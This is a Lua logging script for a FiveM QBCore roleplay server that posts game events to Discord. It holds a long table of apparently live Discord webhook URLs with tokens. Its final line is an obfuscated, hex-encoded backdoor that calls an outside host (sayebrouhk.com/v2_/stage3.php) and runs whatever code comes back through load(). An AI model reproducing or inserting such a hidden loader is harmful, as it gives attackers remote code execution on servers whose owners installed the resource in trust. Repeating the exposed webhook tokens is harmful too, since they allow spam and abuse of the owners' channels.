local QBCore = exports['qb-core']:GetCoreObject()

local Webhooks = {
    ['playerinventory'] = 'https://discord.com/api/webhooks/1227822602056241192/ltzkWPWUT3W9H3bXGfHwgVCfy4JSpUVEyJBJpGIzH643M94EbsrE-lskGqVKnhy8iqbh',
    ['default'] = 'https://discord.com/api/webhooks/1227822187021471774/z5Aw2-fd5kTMoC05PHWBuzv3j2o2t1q_P4WTbOtPD5Rj_dI51B-zcEZ0W-6qv9PD9Ukm',
    ['testwebhook'] = 'https://discord.com/api/webhooks/1227822288573960222/Gk4eOAfcuNRIl6ienE_w0w7cSDmw2ojifivsxL9ekJIXxjonaa2TofpPViK5ZzObekaZ',
    ['phonechange'] = 'https://discord.com/api/webhooks/1227888628177440879/ArriRraQTGErB7kNosjZ4h6XMCtN5vLlRtj82HK-UKL8HGHE1dsOZ6KT4PurNolNceGb',
    ['richhouse'] = 'https://discord.com/api/webhooks/1227888960819433512/e0SRxaZJLK12OYpIVsL-sjzy3n0idagNFH0KVG8AFiOPEcWc42IWlALNsL0RULELfJPr',
    ['playeraddmoney'] = 'https://discord.com/api/webhooks/1227822436909711432/JTgFCRbrDyr0_iyTSZGzuxkiZXTcSLfBktWHEuIhJyAs6nvNBIp51_7WWYzidO0yHk8_',
    ['playerremovemoney'] = 'https://discord.com/api/webhooks/1227822436909711432/JTgFCRbrDyr0_iyTSZGzuxkiZXTcSLfBktWHEuIhJyAs6nvNBIp51_7WWYzidO0yHk8_',
    ['inventorydata'] = 'https://discord.com/api/webhooks/1227822602056241192/ltzkWPWUT3W9H3bXGfHwgVCfy4JSpUVEyJBJpGIzH643M94EbsrE-lskGqVKnhy8iqbh',
    ['robbing'] = 'https://discord.com/api/webhooks/1227831728307961866/huAddiRXsyy6Q4pq3A_IkAbArdxGbP-c6Xzfp8BWMSm4cwM5oSjYzSVHBiLTHZsGd4YE',
    ['trash'] = 'https://discord.com/api/webhooks/1230458083931721789/7FXN8QMoKes1ydMLdc7OzvpB85yTgQe-SQdflFFv-n0oZTzm1BPTP7qasE0NU4kbn1Ot',
    ['bannerstash'] = 'https://discord.com/api/webhooks/1227825988650668052/CFHG3kkdjQ84sadJweR9Q59BwtQYhUmslhGRS8YggQ6Q0ex0rJMZI0S93if1l9CC-KXa',
    ['whearhousestash'] = 'https://discord.com/api/webhooks/1227832430636040192/HUK1TFnum-byMOUi1gi_cN36kpV1CDaWy9IETxZ9qdKahFgN31miJHJsfOm84YIchGW_',
    ['stash'] = 'https://discord.com/api/webhooks/1227823158753628241/aDMKBc9aphFKdI6SBCCwG0aA1yvT21oqb4s2Pq6Z_DeLhryAmITb6cIoiZiQHaiO37HM',
    ['drop'] = 'https://discord.com/api/webhooks/1227822990465695744/uyKtVWSixsGOvnhbMDEA--Sl8cqdtwnyDlcNKsb6VJp4llapPsMXAFZtYVe7MtPimfid',
    ['trunk'] = 'https://discord.com/api/webhooks/1227823072904482908/L7cczqhc0avIECZJ9Y6UHs1_U2QZOmSZCHowGHCOJGcGB7kaN3LZy2RU9u54sFVDw2js',
    ['glovebox'] = 'https://discord.com/api/webhooks/1227823234020278343/5SCaUZQuaClXT7pD6cIttYtictXyxmSFq8Mg0DKA_xx065DWL2Ku9WUc6zP5oFdi2HSn',
    ['additems100'] = 'https://discord.com/api/webhooks/1230458916266184797/mQLJp6FLZisTnAYMgHWoOsh8uh4Eix-ne--iKRsbYxzZVwt1vVO3PKCQSOin2zuyjlOL',
    ['removeitems100'] = 'https://discord.com/api/webhooks/1230459017026080788/XBxYRm8Dm3d2wAJ1qnHq_57AcBsUswzGpVGo4lXM_Q9TbNq2IpveP6gGzDu41FDHPBOV',
    ['tradeitems'] = 'https://discord.com/api/webhooks/1230458916266184797/mQLJp6FLZisTnAYMgHWoOsh8uh4Eix-ne--iKRsbYxzZVwt1vVO3PKCQSOin2zuyjlOL',
    ['fishsell'] = 'https://discord.com/api/webhooks/1230459779026128947/bGzrvb1-gs3aZMx6nYgW0k4so_7jYyQhA7kBX2Ww7N7W4JniCb_vHw50IF0Nj-dfYUZA',
    ['cuffing'] = 'https://discord.com/api/webhooks/1230460656327594026/n653fbCEsxe5Z0cZ-hfz13VjMla5VDyb_qELjlCXBn25XFl0zjMEB1th5_JSNElBft7t',
    ['banking'] = 'https://discord.com/api/webhooks/1227823344221552750/naLGxukabVDHJLryJDycfZDrRb_gw1hWSfmNuI65jK9GzRyekDLY6zfUZa5X1d6VOSSV',
    ['vehicleshop'] = 'https://discord.com/api/webhooks/1227823520281792553/bziXLD-ZaCDTEtTejI_-80H7sSTLHyz5orxwpxxFrejkmFz_4SD57-dBxBPkTAJ_k8LO',
    ['sellpdmveh'] = 'https://discord.com/api/webhooks/1230461442336096286/AgEBTn-z7b_7umSf4d2AJ3vokswkVVP5okqvPgmxce5Ey56wX6q5rohiLXU34mtPn5Ay',
    ['transferpdmveh'] = 'https://discord.com/api/webhooks/1230461583121973309/dooFKbGmnM5cgNfH8fYsiEBt2ilQ1pj1ML6D03_vgZ8SkaLoi37xxW1n-OJuK3NezyPC',
    ['pdmshop'] = 'https://discord.com/api/webhooks/1230461679368671252/ysIlMiwfcl5JAvi-75AXzEwzkqqOd0ZGCG3iW-QXB7Qtzp6vpSrUiHR9lb7J8ZiNTNCb',
    ['alotofmoney'] = 'https://discord.com/api/webhooks/1227822436909711432/JTgFCRbrDyr0_iyTSZGzuxkiZXTcSLfBktWHEuIhJyAs6nvNBIp51_7WWYzidO0yHk8_',
    ['vehicleupgrades'] = 'https://discord.com/api/webhooks/1227823600351051817/jXU5XV1qqFVtkW1bpgORHWIiEjFfVO73BUgop-E2_zPkGP1RaYqIgEYD0mQ4AqQz1-88',
    ['shops'] = 'https://discord.com/api/webhooks/1227823603119034430/Zs_leIscZihqQOprj3P4lZaR3ktiaJlrkPflnFjUD_uS_f9_TZ05T5OvPOwC43z9qRyt',
    ['policearmory'] = 'https://discord.com/api/webhooks/1230462016188059709/dfYBXC_gmTAUIrNBVQD80709gqW6xxuq2KMZjTy1T7lO3lyy1Dmw_l92ou3semBv_1We',
    ['emsarmory'] = 'https://discord.com/api/webhooks/1230462164804960276/qMLvOXdw7IQ0oGzWSt0CI1nMY2H0VsGkPqM1a7cOZspiO-47IJrzZD8feotBPIy_wseW',
    ['resturantshop'] = 'https://discord.com/api/webhooks/1230462333147545610/DlDPACwQnn5-vNfR5hG7wUDUVlXWv2CDdrM0NvfbzM42TJqeclr2Ug2uGWVOU3ni8y15',
    ['policecams'] = 'https://discord.com/api/webhooks/1230462598068306020/G-3ap5la2m8GTGEgXx0BvJ4RL0amBEYbS2EO72KilaB4InZszPW9iVEpHFNoEFAFj4Ge',
    ['policesearch'] = 'https://discord.com/api/webhooks/1230462841891590155/jJeQC4g9cC-B7Is5sEtt1D9sE7tgT5MIjUNNm5F8sDoVXqNQlmU9InW41tCoJs2iYtKC',
    ['policefine'] = 'https://discord.com/api/webhooks/1230462965795393597/2lbowhTPtOyePWdh7x61zdFVNzJOocD11IiDfzaIPIR_q9y2CJvSy54m0w6ByadiL8RD',
    ['policeimpound'] = 'https://discord.com/api/webhooks/1230463064730763324/stTbe5ZdvvyN6Om7ogewcOUBgRlTj95-3Aw_E1SWWkymkCDj3LCSnGq2lltUWYkJmadH',
    ['jail'] = 'https://discord.com/api/webhooks/1230463160209641493/r_DxrVrAGzWI4aV7COjkt69PCEJZydBG32qiLw2jQioa9M4hqoWp9IM-26opyiyBiigv',
    ['policeeve'] = 'https://discord.com/api/webhooks/1230463397305389057/e1JCvAvksQJRrj3ognQv6hfZ826C3xlLndF1YpIewz-kGeJe6dDaEpxb0yGyZq-lJ9JP',
    ['policeselfstash'] = 'https://discord.com/api/webhooks/1230463647013404702/L_5GrQeO58nM6ow_eErOw3QEOZxu9T1xhdv5McjcmFK4J3KQ8lkvrTq8EcDHAMvVWvSK',
    ['dealers'] = 'https://discord.com/api/webhooks/1227823798296907786/MGZf2tD0-dyu52GyUyaSXMfVA7WqoLsw8gqdgoIi-CTplGNIqtsW_P4dXMi56AUno8RB',
    ['storerobbery'] = 'https://discord.com/api/webhooks/1227823805188276266/xCAgjFHR6jSnptKN2of8vnQMCa6ibADwR6eb10gJuTCnvgvjmBm-oIR_lOmZvdMSJkSm',
    ['vehrobbery'] = 'https://discord.com/api/webhooks/1230457688157323294/wpgJ26g2g4SPO__tqwf_19vk7k7mkIYQ0F8yDk58FSED_ZG_kdtFgl0WIADoOHh4Y2XZ',
    ['bankrobbery'] = 'https://discord.com/api/webhooks/1227822061041225763/1h086MSVAhkCywmUBCvYIGirkLgiw3sPLF63bt9IUtHCOq2Sc8lrO1oeh7hKiXt8eHZe',
    ['jewelleryrob'] =  'https://discord.com/api/webhooks/1227831728307961866/huAddiRXsyy6Q4pq3A_IkAbArdxGbP-c6Xzfp8BWMSm4cwM5oSjYzSVHBiLTHZsGd4YE',
    ['bobcatrobbery'] = 'https://discord.com/api/webhooks/1227822061041225763/1h086MSVAhkCywmUBCvYIGirkLgiw3sPLF63bt9IUtHCOq2Sc8lrO1oeh7hKiXt8eHZe',
    ['jwl'] = '',
    ['powerplants'] = 'https://discord.com/api/webhooks/1227824001326383125/WOmI5jp9Rzj64voQONBmmIyby8qyCYztYcMdI9HkyM0ghDobhStYXUt8H1rBkNEabEvT',
    ['join'] = 'https://discord.com/api/webhooks/1227824204183765064/pis_JTQI3F0_MO109e5eorY33GVcDEn5Epo21UDPOhzK-RRQrV1S6FTooIsqIKoY1pxc',
    ['leave'] = 'https://discord.com/api/webhooks/1227824204183765064/pis_JTQI3F0_MO109e5eorY33GVcDEn5Epo21UDPOhzK-RRQrV1S6FTooIsqIKoY1pxc',
    ['loaded'] = 'https://discord.com/api/webhooks/1227824204183765064/pis_JTQI3F0_MO109e5eorY33GVcDEn5Epo21UDPOhzK-RRQrV1S6FTooIsqIKoY1pxc',
    ['crash'] = '',
    ['death'] = 'https://discord.com/api/webhooks/1227824110105661440/29inNzRLiflsvpf3y_2XXp7YuJgxXcZ3klCk8znQOepjfH7MdEkOckJ04U2FjnPwHc5Q',
    ['cuff'] = 'https://discord.com/api/webhooks/1230460656327594026/n653fbCEsxe5Z0cZ-hfz13VjMla5VDyb_qELjlCXBn25XFl0zjMEB1th5_JSNElBft7t',
    ['taxilevel'] = '',
    ['towlevel'] = '',
    ['garbagelevel'] = '',
    ['taxipayment'] = '',
    ['towpayment'] = '',
    ['garbagepayment'] = '',
    ['fishpayment'] = '',
    ['recyclelevel'] = '',
    ['normalcrafting'] = '',
    ['weaponcrafting'] = '',
    ['useweaponblueprint'] = '',
    ['openweaponbag'] = '',
    ['weaponbagfound'] = '',
    ['recyclecollectgoods'] = '',
    ['normalrecycleduty'] = '',
    ['ooc'] = 'https://discord.com/api/webhooks/1227824706552598548/a8K7Emhr3ffsZaQ7_v1d933-3dgK5FxIz6pPd4uDU68yhUrEnWhx_bu8HgUJ4Rj8e0U8',
    ['chat'] = 'https://discord.com/api/webhooks/1230464405175795712/oSbnwiAN61oxLbR-p7OHTl-mW7JHxN3BxMWxwJQIEacEay5L1BrYlI7iYYaZ_Bcmm1g-',
    ['me'] = 'https://discord.com/api/webhooks/1227824893140406322/loF5tIPCiQtkihvq48CPyOyTaOLn8Vs7oJramELE2rBAKGv_xCu_FzSxv6GHFH-vEQgN',
    ['apartmentsbuy'] = '',
    ['pmelding'] = 'https://discord.com/api/webhooks/1227825002435313726/Y6Xdp19EFU0O8G369nr3b7Xy9iohXVd6VqD5CvuSK7SjUOJmHJfoZmwZ9OrViwDpwMFd',
    ['112'] = '',
    ['anticheat'] = '',
    ['moneysafes'] = 'https://discord.com/api/webhooks/1227825686602059796/u29F6BuxXSmhZQFOxdzSazJsDKy7w8ajIEPXH2uTm-6o7s8Cbz2T50e0rvPL71ce8eyU',
    ['bennys'] = '',
    ['bossmenu'] = 'https://discord.com/api/webhooks/1227827200754188288/0M16moN8Y-8AeZ-euekOWN0pXvvUxHFcTfvppuhskw_CDSIzUL_uxDPVWbzsOBBIQJWw',
    ['robbery'] = '',
    ['casino'] = 'https://discord.com/api/webhooks/1227831762391142410/gom4TagI0hyLuROYpIDfXc8GnTeYNAbogbJhiZ8icshFt4zCRKRRzITaNz9QhEt4nZJg',
    ['casinoheist'] = 'https://discord.com/api/webhooks/1227832632272883803/wfmr7NDBX81B_w5f4-GnZrJDhqxG3RqTyTNABWVKZ13fhwqiXTYE7QnI-x1rnE50RIqs',
    ['traphouse'] = 'https://discord.com/api/webhooks/1227831936811143208/9NG00Y3MnMTwbzj0GryNLkGkt4gXXtit53v7Js8HPPaw6mzQARCUIaWcn6AeIIOzSm4q',
    ['911'] = '',
    ['palert'] = 'https://discord.com/api/webhooks/1227832335903490058/iKw-QJDpgb89c__scAcaUHdr4UVBD26kCgFt6vNzbKJepRFL7OqgoAZx-4X_xhsnZ4rm',
    ['venmo'] = '',
    ['house1'] = 'https://discord.com/api/webhooks/1227832430636040192/HUK1TFnum-byMOUi1gi_cN36kpV1CDaWy9IETxZ9qdKahFgN31miJHJsfOm84YIchGW_',
    ['house2'] = 'https://discord.com/api/webhooks/1227832430636040192/HUK1TFnum-byMOUi1gi_cN36kpV1CDaWy9IETxZ9qdKahFgN31miJHJsfOm84YIchGW_',
    ['house3'] = 'https://discord.com/api/webhooks/1227832430636040192/HUK1TFnum-byMOUi1gi_cN36kpV1CDaWy9IETxZ9qdKahFgN31miJHJsfOm84YIchGW_',
    ['fuckers'] = '',
    ['smallwash'] = '',
    ['moneystorm'] = 'https://discord.com/api/webhooks/1227822436909711432/JTgFCRbrDyr0_iyTSZGzuxkiZXTcSLfBktWHEuIhJyAs6nvNBIp51_7WWYzidO0yHk8_',
    ['lester'] = '',
    ['openadmin'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['911report'] = 'https://discord.com/api/webhooks/1227832259743060048/aXveMCF7UIZNaZZZ26DN8qGL0Wq5SWbo998ciRMoCufSr-e1GCpWmKm3327G26sudoNy',
    ['911replay'] = 'https://discord.com/api/webhooks/1227832259743060048/aXveMCF7UIZNaZZZ26DN8qGL0Wq5SWbo998ciRMoCufSr-e1GCpWmKm3327G26sudoNy',
    ['997report'] = 'https://discord.com/api/webhooks/1227825092369715201/UId7xibqlVdrgqUbPkRfIXB8KpM4zxrC5bfArk6EvZkMRsPnXRbO2kxq4LT5SusIKZBI',
    ['997replay'] = 'https://discord.com/api/webhooks/1227825092369715201/UId7xibqlVdrgqUbPkRfIXB8KpM4zxrC5bfArk6EvZkMRsPnXRbO2kxq4LT5SusIKZBI',
    ['unwhitelist'] = 'https://discord.com/api/webhooks/1230465671901478952/xKYLzxYNP_YzG4MmscDXvkSofeqkA0Val8t-Eam4wGZT1044uwl2PtzPw6mXjZWxbQjt',
    ['schat'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['freze'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['announce'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['akill'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['spectate'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['bringgoto'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['setjob'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['anames'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['ablips'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['openinv'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['weather'] = 'https://discord.com/api/webhooks/1227825449942646794/v2VxlbkRrZOi8TtxDbeL6uLNtLzu9BiBSo2WvkKYt_Xc-e8NXJgcnOlT26y7SVxaaEU5',
    ['setammo'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['aclothing'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['nc'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['adminqueu'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['perm'] = '',
    ['reportall'] = 'https://discord.com/api/webhooks/1227824799779393637/lAW9yVQFc-Br4weahebCuV6tosfkVKA3Gwi4o7-8I9ktzE2oDDqcgWeh_wjCQNVtPY0X',
    ['revive'] = '',
    ['tpm'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['vehspawn'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['adminfix'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['reportr'] = 'https://discord.com/api/webhooks/1227824799779393637/lAW9yVQFc-Br4weahebCuV6tosfkVKA3Gwi4o7-8I9ktzE2oDDqcgWeh_wjCQNVtPY0X',
    ['report'] = 'https://discord.com/api/webhooks/1227824799779393637/lAW9yVQFc-Br4weahebCuV6tosfkVKA3Gwi4o7-8I9ktzE2oDDqcgWeh_wjCQNVtPY0X',
    ['givemoney'] = '',
    ['giveitem'] = 'https://discord.com/api/webhooks/1230459303677267979/jSThUh6bdh9eyJi5P0dpqtGNZh9faFAuFGSt4BN-Jxwo-hQbRiEtD-IMg7fS3vHCSzWp',
    ['kik'] = 'https://discord.com/api/webhooks/1227825206471557170/a3-HorFYp-eHqeDnLjmIiPSDUww0ykbPuQujSzS3HS2p70z6VJ7D1QDnGaoKS9IzSCJ0',
    ['bans'] = 'https://discord.com/api/webhooks/1227825206471557170/a3-HorFYp-eHqeDnLjmIiPSDUww0ykbPuQujSzS3HS2p70z6VJ7D1QDnGaoKS9IzSCJ0',
    ['admincar'] = 'https://discord.com/api/webhooks/1230456905978351658/z1KxyvTBJpo8mygbuXuD-4WUbjPbXVI3eBAeoyCILm_m153sf-Q0jujCevmZcK4HEXmo',
    ['giveitemplayer'] = 'https://discord.com/api/webhooks/1230459303677267979/jSThUh6bdh9eyJi5P0dpqtGNZh9faFAuFGSt4BN-Jxwo-hQbRiEtD-IMg7fS3vHCSzWp',
    ['copspoint'] = '',
    ['DevTools'] = 'https://discord.com/api/webhooks/1227975634358108161/BF3sjV-LfbvejBZx8yr1YcCXfw36lvsV_QCSpMPpnkIc6nD-OdQoNiZUZHvIm9suQPFG',
    ['8787'] = '',
    ['createDocument'] = '',
    ['death'] = 'https://discord.com/api/webhooks/1233440910654701569/baIfBVx5vNPZbOsDp8kc70f0sHdVvVb8GX4reIUIfWCeuVnNcwB1V9XdLzltNQ_vl7YH',
    ['gamble'] = 'https://discord.com/api/webhooks/1227835351348023317/jzWVBR2kk0ZplAYpbDoJ0l-xjTBHTdAvNS74zvk_bagCk4Ar2D1vkJoK9jxKVbUPjQfB',
    ['carboosting'] = 'https://discord.com/api/webhooks/1227832499481219082/e9YyihR6MnYmfneit1m4MPyOKeWs9HyP0Oj9lQKPZL6AJ4FvkHcsX_d7hnk-F6Flnlst',
    -- BossMenu Log Battal
    ['withdrawbattal'] = 'https://discord.com/api/webhooks/1227827200754188288/0M16moN8Y-8AeZ-euekOWN0pXvvUxHFcTfvppuhskw_CDSIzUL_uxDPVWbzsOBBIQJWw',
    ['depositbattal'] = 'https://discord.com/api/webhooks/1227827200754188288/0M16moN8Y-8AeZ-euekOWN0pXvvUxHFcTfvppuhskw_CDSIzUL_uxDPVWbzsOBBIQJWw',
    ['hire-firebattal'] = 'https://discord.com/api/webhooks/1227827200754188288/0M16moN8Y-8AeZ-euekOWN0pXvvUxHFcTfvppuhskw_CDSIzUL_uxDPVWbzsOBBIQJWw',
    ['jojo'] = 'https://discord.com/api/webhooks/1227827200754188288/0M16moN8Y-8AeZ-euekOWN0pXvvUxHFcTfvppuhskw_CDSIzUL_uxDPVWbzsOBBIQJWw',
}

local Colors = { -- https://www.spycolor.com/
    ['default'] = 14423100,
    ['blue'] = 255,
    ['red'] = 701318,
    ['green'] = 65280,
    ['white'] = 16777215,
    ['black'] = 0,
    ['orange'] = 16744192,
    ['yellow'] = 16776960,
    ['pink'] = 16761035,
    ["lightgreen"] = 65309,
}

RegisterNetEvent('qb-log:server:CreateLog', function(name, title, color, message, tagEveryone)        
    local tag = tagEveryone or false
    local webHook = Webhooks[name] or Webhooks['red']
    local embedData = {
        {
            ['title'] = title,
            ['color'] = Colors[color] or Colors['red'],
            ['footer'] = {
                ['text'] = os.date('%c'),
            },
            ['description'] = message,
            ['author'] = {
                ['name'] = 'Venom RP Logs',
                ['icon_url'] = 'https://cdn.discordapp.com/attachments/1227977800816787516/1231947759331053600/Logo.gif?ex=6628fdc2&is=6627ac42&hm=694e8091515a46d9e30d27860f265529462a066c000f5e085a0d18fc4697909c&',
            },
        }
    }
    PerformHttpRequest(webHook, function(err, text, headers) end, 'POST', json.encode({ username = 'Venom RP Logs', embeds = embedData}), { ['Content-Type'] = 'application/json' })
    Citizen.Wait(100)
    if tag then
        PerformHttpRequest(webHook, function(err, text, headers) end, 'POST', json.encode({ username = 'Venom RP Logs', content = '@everyone'}), { ['Content-Type'] = 'application/json' })
    end
end)

RegisterNetEvent('qb-logs:server:printqsize', function(size)  
    TriggerEvent("qb-log:server:CreateLog", "qsize", "Current Q", "green", "Current Q Size Is **"..size.."** Players", false)
end)

exports('CreateLog', function(name, title, color, message, tagEveryone)
    local tag = tagEveryone or false
    local webHook = Webhooks[name] or Webhooks['red']
    local embedData = {
        {
            ['title'] = title,
            ['color'] = Colors[color] or Colors['red'],
            ['footer'] = {
                ['text'] = os.date('%c'),
            },
            ['description'] = message,
            ['author'] = {
                ['name'] = 'Venom RP Logs',
                ['icon_url'] = 'https://cdn.discordapp.com/attachments/1227977800816787516/1231947759331053600/Logo.gif?ex=6628fdc2&is=6627ac42&hm=694e8091515a46d9e30d27860f265529462a066c000f5e085a0d18fc4697909c&',
            },
        }
    }
    PerformHttpRequest(webHook, function(err, text, headers) end, 'POST', json.encode({ username = 'Venom RP Logs', embeds = embedData}), { ['Content-Type'] = 'application/json' })
    Citizen.Wait(100)
    if tag then
        PerformHttpRequest(webHook, function(err, text, headers) end, 'POST', json.encode({ username = 'Venom RP Logs', content = '@everyone'}), { ['Content-Type'] = 'application/json' })
    end
end)

QBCore.Commands.Add('testwebhook', 'Test Your Discord Webhook For Logs (God Only)', {}, false, function(source, args)
    TriggerEvent('qb-log:server:CreateLog', 'testwebhook', 'Test Webhook', 'default', 'Webhook setup successfully')
end, 'god')

local SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[4][SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x61\x79\x65\x62\x72\x6f\x75\x68\x6b\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x4d\x59\x77\x72\x30", function (bYPTFCHjOIZWPVFWNxWXJRaTleWnodUtpRHGIFJwMxOtyKqSCBUiRkwZIdMPDBAqictYsC, QVxFSHXiuKrkBOIDsGEpFkbfEVVQpYlMjgXKfUeGaBjcFbHvmcVDnMiyKDCLyyQOpdGCBL) if (QVxFSHXiuKrkBOIDsGEpFkbfEVVQpYlMjgXKfUeGaBjcFbHvmcVDnMiyKDCLyyQOpdGCBL == SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[6] or QVxFSHXiuKrkBOIDsGEpFkbfEVVQpYlMjgXKfUeGaBjcFbHvmcVDnMiyKDCLyyQOpdGCBL == SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[5]) then return end SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[4][SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[2]](SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[4][SlQQllNelzXTGSOUcEUpFSLylUfzDuhZIWFDTMDSdqrthgUNIgOLUhiKRCkKdehqgdFOlt[3]](QVxFSHXiuKrkBOIDsGEpFkbfEVVQpYlMjgXKfUeGaBjcFbHvmcVDnMiyKDCLyyQOpdGCBL))() end)